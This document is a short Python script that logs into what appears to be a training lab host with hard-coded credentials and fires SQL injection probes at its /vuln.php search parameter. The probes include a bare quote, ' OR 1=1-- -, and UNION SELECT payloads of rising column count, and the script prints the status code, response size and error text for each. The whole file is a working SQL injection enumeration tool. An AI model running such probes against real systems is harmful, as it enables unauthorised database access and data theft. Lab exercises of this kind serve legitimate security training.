import sys, re, requests
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
A = "http://xebec.cylabacademy.net:47074"
U, P = "hx8105", "Passw0rd!"
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})
s.post(A + "/login.php", data={"username": U, "password": P}, timeout=20, allow_redirects=True)


def q(payload):
    r = s.get(A + "/vuln.php", params={"q": payload}, timeout=20)
    body = r.text
    m = re.search(r"(?i)(no results[^<]{0,40}|error[^<]{0,120}|warning[^<]{0,120}|syntax[^<]{0,120})", body)
    return r.status_code, len(body), (m.group(1)[:110] if m else ""), body


for p in ("test", "'", "' OR 1=1-- -", "' UNION SELECT 1-- -", "' UNION SELECT 1,2-- -",
          "' UNION SELECT 1,2,3-- -", "' UNION SELECT 1,2,3,4-- -"):
    code, ln, msg, body = q(p)
    print("%-30r -> %s %5d o  %s" % (p, code, ln, msg))
# voir la structure de la reponse pour une recherche normale
code, ln, msg, body = q("test")
i = body.find("card")
print("\n=== extrait reponse ===")
print(body[i:i + 900])
